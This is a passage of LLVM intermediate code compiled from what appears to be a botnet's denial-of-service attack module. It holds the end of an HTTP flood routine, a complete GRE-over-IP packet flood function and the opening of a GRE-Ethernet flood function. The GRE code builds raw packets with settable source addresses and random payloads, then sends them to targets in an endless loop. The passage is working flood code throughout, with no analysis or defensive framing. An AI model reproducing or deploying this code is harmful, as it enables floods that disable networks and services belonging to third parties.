; <label>:869:                                    ; preds = %864
  %870 = call signext i8 @util_strcmp(i8* %866, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #9
  %871 = icmp eq i8 %870, 0
  br i1 %871, label %872, label %874

; <label>:872:                                    ; preds = %869
  %873 = icmp sgt i32 %430, %865
  %.sink13 = select i1 %873, i8 10, i8 1
  br label %874

; <label>:874:                                    ; preds = %864, %869, %872
  %storemerge562 = phi i8 [ %.sink13, %872 ], [ 7, %869 ], [ 7, %864 ]
  store i8 %storemerge562, i8* %417, align 4
  %875 = load i32, i32* %381, align 4
  %876 = sext i32 %865 to i64
  %877 = call i64 @recv(i32 %875, i8* nonnull %21, i64 %876, i32 16384) #9
  br label %.loopexit611

; <label>:878:                                    ; preds = %.preheader610, %.backedge
  %879 = load i32, i32* %419, align 4
  %880 = icmp eq i32 %879, 1024
  br i1 %880, label %881, label %882

; <label>:881:                                    ; preds = %878
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %420, i8* nonnull %421, i64 960, i32 1, i1 false)
  store i32 960, i32* %419, align 4
  br label %882

; <label>:882:                                    ; preds = %881, %878
  %883 = tail call i32* @__errno_location() #10
  store i32 0, i32* %883, align 4
  %884 = load i32, i32* %381, align 4
  %885 = load i32, i32* %419, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %886
  %888 = sub nsw i32 1024, %885
  %889 = sext i32 %888 to i64
  %890 = call i64 @recv(i32 %884, i8* %887, i64 %889, i32 16384) #9
  %891 = trunc i64 %890 to i32
  switch i32 %891, label %897 [
    i32 0, label %.thread601
    i32 -1, label %892
  ]

.thread601:                                       ; preds = %882
  store i32 104, i32* %883, align 4
  br label %894

; <label>:892:                                    ; preds = %882
  %.pr600 = load i32, i32* %883, align 4
  %893 = icmp eq i32 %.pr600, 11
  br i1 %893, label %.loopexit611, label %894

; <label>:894:                                    ; preds = %.thread601, %892
  %895 = load i32, i32* %381, align 4
  %896 = call i32 @close(i32 %895) #9
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit611

; <label>:897:                                    ; preds = %882
  %898 = load i32, i32* %419, align 4
  %899 = add nsw i32 %898, %891
  store i32 %899, i32* %419, align 4
  store i32 %379, i32* %422, align 4
  br label %900

; <label>:900:                                    ; preds = %997, %897
  %901 = phi i32 [ %1004, %997 ], [ %899, %897 ]
  %902 = load i32, i32* %423, align 4
  %903 = icmp sgt i32 %902, 0
  br i1 %903, label %904, label %965

; <label>:904:                                    ; preds = %900
  %905 = icmp sgt i32 %902, %901
  %.sink14 = select i1 %905, i32* %419, i32* %423
  %906 = load i32, i32* %.sink14, align 4
  %907 = sub nsw i32 %902, %906
  store i32 %907, i32* %423, align 4
  %908 = load i32, i32* %424, align 4
  %909 = icmp eq i32 %908, 1
  br i1 %909, label %910, label %965

; <label>:910:                                    ; preds = %904
  %911 = call i8* @table_retrieve_val(i32 36, i32* null)
  %912 = call i32 @util_memsearch(i8* nonnull %420, i32 %901, i8* %911, i32 11)
  %913 = icmp eq i32 %912, -1
  br i1 %913, label %thread-pre-split593, label %914

; <label>:914:                                    ; preds = %910
  %915 = load i32, i32* %419, align 4
  %916 = call i8* @table_retrieve_val(i32 36, i32* null)
  %917 = call i32 @util_memsearch(i8* nonnull %420, i32 %915, i8* %916, i32 11)
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %918
  %920 = load i32, i32* %419, align 4
  %921 = sub nsw i32 %920, %917
  %922 = call i32 @util_memsearch(i8* %919, i32 %921, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %923 = add i32 %917, -1
  %924 = add i32 %923, %922
  %925 = sext i32 %924 to i64
  %926 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %925
  store i8 0, i8* %926, align 1
  %927 = load i32, i32* %426, align 4
  %928 = icmp slt i32 %927, 5
  br i1 %928, label %929, label %964

; <label>:929:                                    ; preds = %914
  %930 = call i32 @util_strlen(i8* %919) #9
  %931 = icmp slt i32 %930, 128
  br i1 %931, label %932, label %964

; <label>:932:                                    ; preds = %929
  %933 = load i32, i32* %426, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %934, i64 0
  %936 = call i32 @util_strcpy(i8* %935, i8* %919) #9
  %937 = load i32, i32* %426, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %938, i64 0
  %940 = call i32 @util_strlen(i8* %939) #9
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %938, i64 %941
  %943 = call i32 @util_strcpy(i8* %942, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0)) #9
  %944 = add i32 %917, 3
  %945 = add i32 %944, %922
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %946
  %948 = load i32, i32* %419, align 4
  %949 = sub nsw i32 %948, %945
  %950 = call i32 @util_memsearch(i8* %947, i32 %949, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %951 = add i32 %945, -1
  %952 = add i32 %951, %950
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %953
  store i8 0, i8* %954, align 1
  %955 = load i32, i32* %426, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %956, i64 0
  %958 = call i32 @util_strlen(i8* %957) #9
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 16, i64 %956, i64 %959
  %961 = call i32 @util_strcpy(i8* %960, i8* %947) #9
  %962 = load i32, i32* %426, align 4
  %963 = add nsw i32 %962, 1
  store i32 %963, i32* %426, align 4
  br label %964

; <label>:964:                                    ; preds = %932, %929, %914
  store i32 -1, i32* %423, align 4
  store i8 10, i8* %417, align 4
  br label %.loopexit611

thread-pre-split593:                              ; preds = %910
  %.pr594 = load i32, i32* %423, align 4
  br label %965

; <label>:965:                                    ; preds = %thread-pre-split593, %904, %900
  %966 = phi i32 [ %.pr594, %thread-pre-split593 ], [ %907, %904 ], [ %902, %900 ]
  %.0542 = phi i32 [ %906, %thread-pre-split593 ], [ %906, %904 ], [ 0, %900 ]
  %967 = icmp eq i32 %966, 0
  br i1 %967, label %968, label %995

; <label>:968:                                    ; preds = %965
  %969 = load i32, i32* %425, align 4
  %970 = icmp eq i32 %969, 1
  %971 = load i32, i32* %419, align 4
  br i1 %970, label %972, label %990

; <label>:972:                                    ; preds = %968
  %973 = call i32 @util_memsearch(i8* nonnull %420, i32 %971, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %974 = icmp eq i32 %973, -1
  br i1 %974, label %995, label %975

; <label>:975:                                    ; preds = %972
  %976 = add nsw i32 %973, -2
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %977
  store i8 0, i8* %978, align 1
  %979 = call i32 @util_memsearch(i8* nonnull %420, i32 %973, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %980 = icmp eq i32 %979, -1
  br i1 %980, label %984, label %981

; <label>:981:                                    ; preds = %975
  %982 = sext i32 %979 to i64
  %983 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %982
  store i8 0, i8* %983, align 1
  br label %984

; <label>:984:                                    ; preds = %975, %981
  %985 = call i32 @util_atoi(i8* nonnull %420, i32 16) #9
  %986 = icmp eq i32 %985, 0
  br i1 %986, label %987, label %988

; <label>:987:                                    ; preds = %984
  store i8 1, i8* %417, align 4
  br label %.loopexit611

; <label>:988:                                    ; preds = %984
  %989 = add nsw i32 %985, 2
  store i32 %989, i32* %423, align 4
  br label %995

; <label>:990:                                    ; preds = %968
  %991 = sub nsw i32 %971, %.0542
  store i32 %991, i32* %423, align 4
  %992 = icmp eq i32 %991, 0
  br i1 %992, label %993, label %995

; <label>:993:                                    ; preds = %990
  store i8 1, i8* %417, align 4
  br label %.loopexit611

.backedge:                                        ; preds = %995, %997
  %.pr = load i8, i8* %417, align 4
  %994 = icmp eq i8 %.pr, 7
  br i1 %994, label %878, label %.loopexit611.loopexit

; <label>:995:                                    ; preds = %972, %988, %990, %965
  %.1543 = phi i32 [ %973, %988 ], [ %.0542, %972 ], [ %.0542, %990 ], [ %.0542, %965 ]
  %996 = icmp eq i32 %.1543, 0
  br i1 %996, label %.backedge, label %997

; <label>:997:                                    ; preds = %995
  %998 = load i32, i32* %419, align 4
  %999 = sub nsw i32 %998, %.1543
  store i32 %999, i32* %419, align 4
  %1000 = sext i32 %.1543 to i64
  %1001 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %1000
  %1002 = sext i32 %999 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %420, i8* %1001, i64 %1002, i32 1, i1 false)
  %1003 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv679, i32 18, i64 %1002
  store i8 0, i8* %1003, align 1
  %1004 = load i32, i32* %419, align 4
  %1005 = icmp eq i32 %1004, 0
  br i1 %1005, label %.backedge, label %900

.preheader612:                                    ; preds = %.preheader612.preheader, %.preheader612
  %1006 = tail call i32* @__errno_location() #10
  store i32 0, i32* %1006, align 4
  %1007 = load i32, i32* %381, align 4
  %1008 = call i64 @recv(i32 %1007, i8* nonnull %21, i64 10240, i32 16384) #9
  %1009 = trunc i64 %1008 to i32
  switch i32 %1009, label %.preheader612 [
    i32 0, label %.thread604
    i32 -1, label %1010
  ]

.thread604:                                       ; preds = %.preheader612
  store i32 104, i32* %1006, align 4
  br label %.thread598

; <label>:1010:                                   ; preds = %.preheader612
  %.pr603 = load i32, i32* %1006, align 4
  %1011 = icmp eq i32 %.pr603, 11
  br i1 %1011, label %1014, label %.thread598

.thread598:                                       ; preds = %1010, %.thread604
  %1012 = load i32, i32* %381, align 4
  %1013 = call i32 @close(i32 %1012) #9
  store i32 -1, i32* %381, align 4
  store i8 0, i8* %417, align 4
  br label %.loopexit611

; <label>:1014:                                   ; preds = %1010
  %.pr597 = load i8, i8* %417, align 4
  %1015 = icmp eq i8 %.pr597, 0
  br i1 %1015, label %.loopexit611, label %1016

; <label>:1016:                                   ; preds = %1014
  store i8 1, i8* %417, align 4
  br label %.loopexit611

.loopexit611.loopexit:                            ; preds = %.backedge
  br label %.loopexit611

.loopexit611:                                     ; preds = %.loopexit611.loopexit, %993, %987, %964, %.thread598, %416, %892, %1014, %405, %894, %1016, %874, %435, %.lr.ph653, %861, %700, %432, %401
  %indvars.iv.next680 = add nuw nsw i64 %indvars.iv679, 1
  %1017 = icmp slt i64 %indvars.iv.next680, %48
  br i1 %1017, label %.lr.ph653, label %.backedge616.loopexit

; <label>:1018:                                   ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

declare i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strcmp(i8*, i8*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strncmp(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %183, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #9
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %45, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  %.pre = sext i32 %21 to i64
  %.pre129 = add nsw i64 %.pre, 52
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = trunc i64 %.pre129 to i16
  %37 = icmp ne i8 %16, 0
  %38 = add nsw i64 %.pre, 28
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %12, -1
  %41 = icmp eq i8 %25, 0
  %42 = add nsw i64 %.pre, 8
  %43 = trunc i64 %42 to i16
  %44 = zext i8 %0 to i64
  br label %58

; <label>:45:                                     ; preds = %30
  %46 = call i32 @close(i32 %28) #9
  br label %183

..preheader_crit_edge:                            ; preds = %98
  %47 = trunc i64 %indvars.iv.next to i32
  store i32 %47, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %48 = icmp eq i32 %27, -1
  %49 = and i32 %11, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = and i32 %17, 65535
  %52 = icmp eq i32 %51, 65535
  %53 = and i32 %19, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = icmp eq i8 %25, 0
  %56 = icmp eq i8 %23, 0
  %57 = add i32 %21, 8
  br label %.loopexit

; <label>:58:                                     ; preds = %.lr.ph127, %98
  %indvars.iv = phi i64 [ 0, %.lr.ph127 ], [ %indvars.iv.next, %98 ]
  %59 = call noalias i8* @calloc(i64 1510, i64 8) #9
  %60 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %59, i8** %60, align 8
  %61 = getelementptr inbounds i8, i8* %59, i64 24
  %62 = getelementptr inbounds i8, i8* %59, i64 44
  store i8 69, i8* %59, align 4
  %63 = getelementptr inbounds i8, i8* %59, i64 1
  store i8 %10, i8* %63, align 1
  %64 = call zeroext i16 @htons(i16 zeroext %36) #10
  %65 = getelementptr inbounds i8, i8* %59, i64 2
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %12) #10
  %68 = getelementptr inbounds i8, i8* %59, i64 4
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 4
  %70 = getelementptr inbounds i8, i8* %59, i64 8
  store i8 %14, i8* %70, align 4
  br i1 %37, label %71, label %75

; <label>:71:                                     ; preds = %58
  %72 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %73 = getelementptr inbounds i8, i8* %59, i64 6
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  br label %75

; <label>:75:                                     ; preds = %71, %58
  %76 = getelementptr inbounds i8, i8* %59, i64 9
  store i8 47, i8* %76, align 1
  %77 = getelementptr inbounds i8, i8* %59, i64 12
  %78 = bitcast i8* %77 to i32*
  store i32 %27, i32* %78, align 4
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i8, i8* %59, i64 16
  %82 = bitcast i8* %81 to i32*
  store i32 %80, i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext 2048) #10
  %84 = getelementptr inbounds i8, i8* %59, i64 22
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  store i8 69, i8* %61, align 4
  %86 = getelementptr inbounds i8, i8* %59, i64 25
  store i8 %10, i8* %86, align 1
  %87 = call zeroext i16 @htons(i16 zeroext %39) #10
  %88 = getelementptr inbounds i8, i8* %59, i64 26
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %40) #10
  %91 = getelementptr inbounds i8, i8* %59, i64 28
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 4
  %93 = getelementptr inbounds i8, i8* %59, i64 32
  store i8 %14, i8* %93, align 4
  br i1 %37, label %94, label %98

; <label>:94:                                     ; preds = %75
  %95 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %96 = getelementptr inbounds i8, i8* %59, i64 30
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  br label %98

; <label>:98:                                     ; preds = %94, %75
  %99 = getelementptr inbounds i8, i8* %59, i64 33
  store i8 17, i8* %99, align 1
  %. = select i1 %41, i32 1023, i32 %80
  %100 = getelementptr inbounds i8, i8* %59, i64 40
  %101 = bitcast i8* %100 to i32*
  store i32 %., i32* %101, align 4
  %102 = call zeroext i16 @htons(i16 zeroext %18) #10
  %103 = bitcast i8* %62 to i16*
  store i16 %102, i16* %103, align 2
  %104 = call zeroext i16 @htons(i16 zeroext %20) #10
  %105 = getelementptr inbounds i8, i8* %59, i64 46
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %43) #10
  %108 = getelementptr inbounds i8, i8* %59, i64 48
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %110 = icmp slt i64 %indvars.iv.next, %44
  br i1 %110, label %58, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %154
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %35, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %154
  %storemerge124126 = phi i32 [ %181, %154 ], [ 0, %.lr.ph.preheader ]
  %111 = sext i32 %storemerge124126 to i64
  %112 = getelementptr inbounds i8*, i8** %8, i64 %111
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 24
  %115 = bitcast i8* %114 to %struct.iphdr*
  %116 = getelementptr inbounds i8, i8* %113, i64 44
  %117 = getelementptr inbounds i8, i8* %113, i64 52
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %111, i32 2
  %119 = load i8, i8* %118, align 4
  %120 = icmp ult i8 %119, 32
  br i1 %120, label %121, label %128

; <label>:121:                                    ; preds = %.lr.ph
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %111, i32 1
  %123 = load i32, i32* %122, align 4
  %124 = call i32 @ntohl(i32 %123) #10
  %125 = call i32 @htonl(i32 %124) #10
  %126 = getelementptr inbounds i8, i8* %113, i64 16
  %127 = bitcast i8* %126 to i32*
  store i32 %125, i32* %127, align 4
  br label %128

; <label>:128:                                    ; preds = %121, %.lr.ph
  br i1 %48, label %129, label %132

; <label>:129:                                    ; preds = %128
  %130 = getelementptr inbounds i8, i8* %113, i64 12
  %131 = bitcast i8* %130 to i32*
  store i32 0, i32* %131, align 4
  br label %132

; <label>:132:                                    ; preds = %129, %128
  br i1 %50, label %133, label %138

; <label>:133:                                    ; preds = %132
  %134 = getelementptr inbounds i8, i8* %113, i64 4
  %135 = bitcast i8* %134 to i16*
  store i16 0, i16* %135, align 4
  %136 = getelementptr inbounds i8, i8* %113, i64 28
  %137 = bitcast i8* %136 to i16*
  store i16 999, i16* %137, align 4
  br label %138

; <label>:138:                                    ; preds = %133, %132
  br i1 %52, label %139, label %141

; <label>:139:                                    ; preds = %138
  %140 = bitcast i8* %116 to i16*
  store i16 0, i16* %140, align 2
  br label %141

; <label>:141:                                    ; preds = %139, %138
  br i1 %54, label %142, label %145

; <label>:142:                                    ; preds = %141
  %143 = getelementptr inbounds i8, i8* %113, i64 46
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 2
  br label %145

; <label>:145:                                    ; preds = %142, %141
  br i1 %55, label %150, label %146

; <label>:146:                                    ; preds = %145
  %147 = getelementptr inbounds i8, i8* %113, i64 16
  %148 = bitcast i8* %147 to i32*
  %149 = load i32, i32* %148, align 4
  br label %150

; <label>:150:                                    ; preds = %145, %146
  %.sink3 = phi i32 [ %149, %146 ], [ 0, %145 ]
  %151 = getelementptr inbounds i8, i8* %113, i64 40
  %152 = bitcast i8* %151 to i32*
  store i32 %.sink3, i32* %152, align 4
  br i1 %56, label %154, label %153

; <label>:153:                                    ; preds = %150
  call void @rand_str(i8* nonnull %117, i32 %21)
  br label %154

; <label>:154:                                    ; preds = %150, %153
  %155 = getelementptr inbounds i8, i8* %113, i64 10
  %156 = bitcast i8* %155 to i16*
  store i16 0, i16* %156, align 2
  %157 = bitcast i8* %113 to i16*
  %158 = call zeroext i16 @checksum_generic(i16* %157, i32 20) #9
  store i16 %158, i16* %156, align 2
  %159 = getelementptr inbounds i8, i8* %113, i64 34
  %160 = bitcast i8* %159 to i16*
  store i16 0, i16* %160, align 2
  %161 = bitcast i8* %114 to i16*
  %162 = call zeroext i16 @checksum_generic(i16* %161, i32 20) #9
  store i16 %162, i16* %160, align 2
  %163 = getelementptr inbounds i8, i8* %113, i64 50
  %164 = bitcast i8* %163 to i16*
  store i16 0, i16* %164, align 2
  %165 = getelementptr inbounds i8, i8* %113, i64 48
  %166 = bitcast i8* %165 to i16*
  %167 = load i16, i16* %166, align 2
  %168 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %115, i8* nonnull %116, i16 zeroext %167, i32 %57) #9
  store i16 %168, i16* %164, align 2
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 0
  store i16 2, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %113, i64 16
  %173 = bitcast i8* %172 to i32*
  %174 = load i32, i32* %173, align 4
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 2, i32 0
  store i32 %174, i32* %175, align 4
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 1
  store i16 0, i16* %176, align 2
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0
  %178 = bitcast %struct.sockaddr_in* %177 to %struct.sockaddr*
  %179 = call i64 @sendto(i32 %28, i8* nonnull %113, i64 %.pre129, i32 16384, %struct.sockaddr* %178, i32 16) #9
  %180 = load i32, i32* %5, align 4
  %181 = add nsw i32 %180, 1
  store i32 %181, i32* %5, align 4
  %182 = icmp slt i32 %181, %34
  br i1 %182, label %.lr.ph, label %.loopexit.loopexit

; <label>:183:                                    ; preds = %4, %45
  ret void
}

declare zeroext i16 @checksum_generic(i16*, i32) local_unnamed_addr #3

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) local_unnamed_addr #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = zext i8 %0 to i64
  %10 = tail call noalias i8* @calloc(i64 %9, i64 8) #9
  %11 = bitcast i8* %10 to i8**
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %19 = trunc i32 %18 to i8
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %26 = trunc i32 %25 to i8
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* @LOCAL_ADDR, align 4
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %29)
  %31 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %197, label %33

; <label>:33:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %34 = bitcast i32* %5 to i8*
  %35 = call i32 @setsockopt(i32 %31, i32 0, i32 3, i8* nonnull %34, i32 4) #9
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %48, label %.preheader132

.preheader132:                                    ; preds = %33
  store i32 0, i32* %5, align 4
  %37 = zext i8 %0 to i32
  %38 = icmp eq i8 %0, 0
  %.pre = sext i32 %24 to i64
  %.pre136 = add nsw i64 %.pre, 66
  br i1 %38, label %.preheader, label %.lr.ph134

.lr.ph134:                                        ; preds = %.preheader132
  %39 = trunc i64 %.pre136 to i16
  %40 = icmp ne i8 %19, 0
  %41 = add nsw i64 %.pre, 28
  %42 = trunc i64 %41 to i16
  %43 = xor i16 %15, -1
  %44 = icmp eq i8 %28, 0
  %45 = add nsw i64 %.pre, 8
  %46 = trunc i64 %45 to i16
  %47 = zext i8 %0 to i64
  br label %65

